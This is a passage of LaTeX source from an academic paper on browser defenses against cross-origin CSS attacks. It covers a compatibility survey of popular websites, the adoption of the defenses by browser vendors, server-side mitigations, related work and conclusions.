labeled with the wrong \verb|Content-Type|; we observed 572 such
futile requests in our sample.  From sites in quirks mode, there were
437 requests for sheets that were labeled with the wrong type; these
sheets are honored.

The crawler also recorded whether a style sheet was served from the
same origin as the requesting HTML document.  \todo{If an external
  sheet imported another sheet, was the crawler's origin check
  relative to the importing sheet or relative to the original HTML?}
It is most common to serve style sheets from the same origin as the
HTML, but we did observe 54,018 cross-origin requests, 6,075 of which
were for pages in quirks mode.  Only 74 of those cross-origin requests
were labeled with the wrong \verb|Content-Type|.

Finally, the crawler checked whether each sheet began with a
well-formed CSS construct.  1,059 sheets (0.41\% of the sample) were
not well-formed.  (It is interesting to note that a common error among
these ill-formed sheets is to start the file with an HTML
\verb|<style>| tag.)  Only 60 sheets were both malformed and labeled
with an incorrect \verb|Content-Type|, and none of these were served
cross-origin.

\paragraph{Discussion}
Within the Alexa top 100,000 web sites, we observed a total of 1,009
CSS resources labeled with an incorrect MIME type (excluding responses
with HTTP errors).  Of these, 572 are associated with sites being
rendered in standards mode, and are therefore already being ignored.
Of the remaining 437 style sheets, 74 are loaded cross-origin; these
are the sheets that would be rejected by the strict defense, breaking
no more than 0.06\% of the Alexa sites.  \todo{Was each of these 74
  \emph{sheets} associated with a different \emph{site}?}
This is a tiny number, but browser vendors have historically been
reluctant to deploy changes that break popular web sites.  Our
tolerant defense, which accepts cross-origin, mislabeled sheets unless
they are also malformed, would not break any of the Alexa sites.

Many of the Alexa top 100,000 sites provide additional content to
registered users.  We did not attempt to create accounts on any of the
sites; our results are strictly for unauthenticated access.  It is
possible that more sites would be broken (by either form of the
defense) if viewed by an authenticated user.

\subsubsection{Adoption}
Our proposal has already been adopted by several major browsers.  We
implemented the tolerant defense for WebKit, and both the tolerant and
strict defenses for Mozilla's Gecko engine.  The tolerant defense has
been deployed in Google Chrome (version~4.0.249.78), Safari
(version~4.0.5), and both Firefox~3.5.11 and~3.6.7.  Firefox~4 instead
offers the strict defense, which Mozilla considers preferable in the
long term.  Inspired by our WebKit patch, Opera has also implemented
the tolerant defense for version~10.10 of their browser.

\subsubsection{Missing or Ill-Formed Content Types}\label{sec:missing}
To be fully reliable, our proposed defenses should be applied whenever
a style sheet lacks the \verb|Content-Type: text/css| label, including
when the \texttt{Content-Type} header is missing or has an ill-formed
value.  Recall from Table~\ref{table:MIME} that we saw 178 CSS
resources that lacked a Content-Type header in our survey.  However,
as shown in Table~\ref{table:adoption}, most browsers---with the
notable exception of Opera---do accept cross-origin style sheets if
they lack a \texttt{Content-Type} header, even in standards mode.
Firefox ignores \texttt{Content-Type} headers that it cannot parse
(e.g.~\verb|Content-Type: */*|) and will therefore also accept a
cross-origin style sheet with an unparseable \texttt{Content-Type}.
Finally, Webkit and Firefox both treat the special type
\texttt{application/x-unknown-content-type} the same as the absence of
a header.

These gaps in the defense could open up a target server to attack, if
it fails to set a \texttt{Content-Type} header on its HTML
documents. We have not yet observed any web servers in the wild that
are affected by this vulnerability, but browsers may wish to follow
Opera's lead and block such style sheets when loaded across
origins. In any case, we recommend that servers always provide a
correct Content-Type header.

\subsection{Other Client-Side Approaches}
Other defensive approaches could be deployed in browsers without
modifying web servers, but we claim that all of them could easily be
circumvented, or else would significantly reduce web compatibility.

\paragraph{Block Cookies}
If HTTP cookies are disabled in the browser, web attackers cannot
steal content from cookie-authenticated sites.  However, completely
disabling cookies renders many sites unusable.  Some browsers have the
option to block only “third-party” cookies, which prevents cookies
from being \emph{set} by a cross-origin load.  Unfortunately, this
mode typically does not block cookies from being \emph{sent} with a
cross-origin load, because some sites require session cookies for
cross-origin resources~\cite{jackson06thirdpartycookies}.  Blocking
only cookie sets does not block cross-origin CSS attacks.

\paragraph{Block JavaScript Style APIs}
Many browsers already prevent JavaScript from reading parsed style
rules when those rules were loaded cross-origin; this could be done
more thoroughly, and they could also prevent access to computed style
when the chosen value came from a cross-origin sheet.  These changes
would stop some attacks, but an attacker could still use the
\texttt{background-image} approach that does not require JavaScript.

\paragraph{Stricter CSS Parsing}
Cross-origin CSS attacks would be much more difficult if the CSS
parser threw away the entire style sheet on any syntax error.
Unfortunately, this would ruin CSS's forward compatibility feature,
and would break many existing web sites.

\subsection{Server-side Mitigation}
Web sites have several options for rendering themselves less
vulnerable to cross-origin CSS attacks.  Despite the rapid uptake of
our proposed client-side defense, we still recommend that site
maintainers consider these server-side mitigations, to protect site
users who are still using a browser with no defense.

\paragraph{Newlines}
The CSS specification does not allow strings and URLs to contain
newlines.  Most browsers honor this rule, so sites can defend against
cross-origin CSS attacks by inserting newlines before and after
potential injection points.  However, this does not protect users of
Internet Explorer, which at the time of writing is the only major
browser not to have adopted a defense.

\paragraph{HTML encoding}
As we mentioned in section~\ref{sec:limits}, CSS-based attacks can be
prevented by replacing the punctuation within the injected strings
with HTML entities.  Existing filters often already do this for
quotation marks, but quotation marks are not required for the attack;
the attacker could use an unquoted \texttt{url()} instead.  We
recommend escaping curly braces in user-submitted content as well,
using \verb|&#123;| and \verb|&#125;|.  This will block all known
forms of the attack, as long as the attacker cannot force UTF-7
encoding (see below).  Unfortunately, at present, most server-side
languages' utility functions for entity-encoding punctuation will not
encode these characters.

\paragraph{Content-Type}
Our browser-side defense is ineffective for target sites that do not
label all HTTP responses, especially those that contain confidential
information, with the proper \texttt{Content-Type} header, as
discussed in section~\ref{sec:missing}.  It is also important to
ensure that the \texttt{Content-Type} header includes a character set
declaration.  Otherwise, in a browser with no defense, the attacker
may be able to defeat HTML entity encoding of quotes and curly braces
by forcing the target page to be interpreted as UTF-7.  Declaring the
character set in a \texttt{meta} tag inside the document is not good
enough, because the CSS parser will not recognize that tag.

If it is impossible to get a character set declaration into the HTTP
headers for some reason, entity-encoding plus signs as \verb|&#43;|
would also prevent the attacker from using UTF-7.

\paragraph{Avoid Ambient Authentication}
Cross-site attacks rely on the browser transmitting “ambient”
authentication information, such as HTTP credentials or session
cookies, with any request to the target site.  A site that makes no
use of these is less vulnerable.  One possible alternative is the
web-key authentication scheme~\cite{webkey}, which embeds credentials
in site URLs instead of cookies.  The attacker is foiled, as they
cannot guess these URLs.  However, if a URL with a credential becomes
visible to the victim user (e.g.\ via the location bar), they might be
tricked into revealing it.

\section{Related Work} \label{sec:relatedwork}
In this section, we review current browser defense techniques that are
used to defend against similar attacks: content-sniffing XSS and
JavaScript hijacking.  We also consider recent research proposals for
secure web browsers and their protection against the cross-origin CSS
attack.

\subsection{Content-Sniffing XSS Defenses}
In a content-sniffing XSS attack, the attacker uploads a crafted chameleon
document that conforms to a benign file format (e.g. PostScript) to an honest
web site and causes the victim user's browser to treat the file as HTML and
renders the attacker's evil page in the honest site's domain. Such
vulnerabilities are caused by discrepancies between the browser's
content-sniffing algorithm and the web site's upload filter. A secure
content-sniffing algorithm~\cite{securecontentsniffing} was proposed to
protect web sites from this attack by avoiding privilege escalation and using
prefix-disjoint signatures. The \texttt{X-Content-Type-Options}
header~\cite{nosniff} proposed by Microsoft allows web sites to opt-out of
MIME sniffing in supporting browsers by specifying the \texttt{nosniff}
directive in the HTTP response header. Neither the content-sniffing algorithm
nor the \texttt{nosniff} directive are triggered for loading style sheets,
thus both approaches do not prevent the cross-origin CSS attack.

\subsection{JavaScript Hijacking Defenses}
JavaScript Hijacking~\cite{jshijacking} is a vulnerability that allows the
attacker to steal sensitive data from an honest web site that uses JavaScript
as data transport format, such as JavaScript Object Notation (JSON) messages.
Since the browser security model allows importing scripts from a different
domain, the attacker can use a script tag in their evil page to include the
target JavaScript object. One solution is to prevent direct
execution of the responses by prefixing each JavaScript object with a
\texttt{while(1);} statement. The malicious page using script tag will execute
the infinite loop while the legitimate client application can modify the
response before executing it. Servers can also mitigate the attack by responding only to HTTP POST requests because the script tag always uses GET requests to load external libraries. Another defense approach is to include secret tokens in every legitimate request, which can not be forged by the attacker.
This approach may also be used in defense of the cross-origin
CSS attack, but puts the burden on web developers to implement secure
applications.

\subsection{OP Browser}
The OP web browser~\cite{op-browser} uses sandboxing techniques to isolate and
contain failures in browser components. Because OP attaches cookies to
cross-origin network requests just like any other browser, its architecture
does not provide any automatic protection against cross-origin CSS attacks.
However, the OP browser does maintain a detailed security audit log that could
be used by forensics experts to identify the site where the attack originated.

\subsection{Gazelle Browser}
The Gazelle browser~\cite{gazelle} is proposed as a secure web browser that exclusively controls resource protection and sharing across web sites, or principals, as a multi-principal OS. In their architecture, all cross-principal communication are explicitly mediated by the browser kernel to prevent cross-origin attacks. Cross-origin resources are protected and only retrieved if the content is a script or a style sheet, based on the Content-Type header of the HTTP response. Gazelle provides the same protection against cross-origin CSS attacks as the strict approach, at the cost of site incompatibility. From our compatibility evaluation results, the strict approach would affect the rendering of page styles on 62 of the top 100,000 web sites.

\subsection{SOMA}
The Same Origin Mutual Approval (SOMA) policy~\cite{soma} restricts communication between origins by requiring mutual approval between a web page's originating server and other servers across origins. In the SOMA system, each originating web site provides a manifest file that contains a whitelist of origins for outbound requests, enforced in the browser. On the other side, remote servers will only serve its contents to requests that originated from their list of approved domains. This design prevents leaking confidential data to unapproved sites and mitigates the cross-origin CSS attack. However, the negotiation scheme costs additional round-trip requests and require modifications to the participating web sites and browsers.

\section{Conclusions} \label{sec:conclusion}
In this paper, we presented two defense approaches for cross-origin CSS attacks. The strict approach is based solely on MIME type
checking, while the conservative approach uses the CSS parser to
address web site compatibility issues. We evaluated the compatibility of our
proposed solution over the top 100,000 web sites. Without relying on web site
modifications, the conservative approach completely mitigates the attack while
maximizing site compatibility. We found that common server misconfigurations
introduced false positives in the strict approach and would cause 0.06\%
sites to render incorrectly. We recommend that web administrators should
properly configure servers to specify the correct MIME type and character set in HTTP Content-Type headers to avoid false
positives. Our proposal has been adopted in several major browsers, including
Firefox, Google Chrome, Safari and Opera.

\section*{Acknowledgements}

We thank Dave Hyatt, Sam Weinig, Maciej Stachowiak, and Adam Barth of the
WebKit project and David Baron and Boris Zbarsky of Mozilla for reviewing our implementations of cross-origin CSS defenses.

\bibliographystyle{abbrv}
\bibliography{css}

\end{document}

\begin{figure*}
\centering
\includegraphics[width=\linewidth]{steps}
\caption{Steps of the Cross-Origin CSS Attack}
\label{figure:steps}
\end{figure*}

